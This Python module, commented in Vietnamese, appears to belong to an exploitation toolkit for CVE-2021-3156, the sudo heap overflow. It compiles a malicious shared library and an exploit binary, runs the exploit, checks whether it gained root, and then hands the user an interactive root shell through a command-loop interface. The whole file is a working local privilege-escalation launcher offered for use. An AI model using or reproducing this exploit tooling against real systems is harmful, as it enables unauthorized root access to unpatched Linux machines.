'''
b1: xây dựng file leo quyền
b2: build file leo quyền thành libc
b3: xây dựng file exploit 
b4: buid file exploit
b5: chạy file exploit
'''
from pwn import process
from importFile import root_directory
from executeCommand import executeOnce
from formatOutput.prettyAnnounce import log,bcolors
from util import is_path_exist
from cmd import Cmd

exploit_executable_name = 'poc'
lpe_libc_name = 'lpe_libc.so.2'
module_root_path = root_directory + "/linux/cve_2021_3156/"
exploit_src_path = module_root_path+'exploit.c'
exploit_executable_path = module_root_path+'poc'
lpe_src_path = module_root_path + "lpe_libc.c"
lpe_dir = module_root_path +"libnss_a"

def build_get_root_libc():
    '''
    Compile file get root libc thành shared libc
    '''
    if(is_path_exist(lpe_dir) == True):
        log.info("Phát hiện thư mục shared object cũ ! Thực hiện xoá !")
        executeOnce(f"rm -rf {lpe_dir}")
    log.info("Khởi tạo thư mục shared object mới")
    # print(lpe_dir)
    # print(root_directory)
    # print()
    executeOnce(f"mkdir {lpe_dir}")
    log.done("Khởi tạo thư mục shared object mới thành công !")
    log.info("Biên dịch source tạo thành đối tượng shared libc !")
    check = executeOnce(f"gcc -fPIC -shared -o {lpe_dir}/{lpe_libc_name} {lpe_src_path}")
    # print(check)
    if(b'error' in check.stderr):
        log.fail("Biên dịch thất bại, xin hãy báo cáo với admin !")
        return False
    else:
        log.done(f"Biên dịch thành công, shared libc nằm ở thư mục {lpe_dir}")
        return True

def build_exploit():
    '''
    Compile file exploit thành file thực thi
    '''
    
    if(is_path_exist(exploit_src_path)==True):
        log.info("Biên dịch source khai thác lỗi.")
        check = executeOnce(f"gcc -std=c99 -o {module_root_path}/poc {exploit_src_path}")
        # print(check)
        if(check.returncode<0):
            log.fail("Biên dịch thất bại, xin hãy báo cáo với admin !")
            return False
        else:
            log.done(f"Biên dịch thành công, tệp thực thi khai thác nằm ở thư mục {module_root_path}/poc")
            return True



def clean():
    '''
    Xoá các file thừa
    '''

class succes_promt(Cmd):
    
    def __init__(self,proc:process):
        super().__init__()
        self.proc = proc

    intro = f'{bcolors.OKCYAN}Giao diện giao tiếp root ... Gõ ? để xem danh sách chức năng{bcolors.ENDC}'
    prompt = f'{bcolors.WARNING}root{bcolors.ENDC} {bcolors.BOLD}>>>{bcolors.ENDC} '
    doc_header = f"{bcolors.OKGREEN}Gõ help <command> để xem cách sử dụng{bcolors.ENDC}"
    undoc_header = f"{bcolors.OKGREEN}Một số command khác{bcolors.ENDC}"
    def do_help(self, arg: str) :
        '''Hướng dẫn sử dụng các câu lệnh trong trình giao tiếp'''
        return super().do_help(arg)
    
    def do_exit(self, arg):
        '''Thoát giao diện giao tiếp root'''
        
        self.proc.close()
        log.done("Đóng root shell!")
        log.done("Thoát tiến trình khai thác!")
        return True
    
    def do_shell(self,arg):
        '''Trực tiếp thao tác trên shell bằng quyền của root'''
        s = self.proc
        if(s.poll()==None):
            while(1):
                promt_symbols = f"{bcolors.FAIL}# {bcolors.ENDC}"
                command = str(input(promt_symbols)).strip('\n')
                if(command == 'qexit'):
                    log.info("Thoát root shell!")
                    break
                try:
                    s.sendline(command)
                    while(True):
                        out = s.recvline(timeout=0.3).strip(b'\n').decode()
                        if(out==''):
                            break
                        print(out)
                except:
                    log.info("Tiến trình root shell đã đóng!")
                    break
        else:
            log.fail("Tiến trình root shell đã đóng!")
    # def do_list

def run():
    if(build_get_root_libc() == True and build_exploit()==True):
        log.info("Bắt đầu chạy tệp tin khai thác !")
        s = process(exploit_executable_path)
        # s.interactive()
        s.sendline('id')
        output = s.recvline()
        if(b'root' not in output):
            log.fail("Khai thác thất bại! Không thể lấy quyền root! Liên lạc admin!")
        else:
            promt = succes_promt(s)
            promt.cmdloop()


    #run exploit

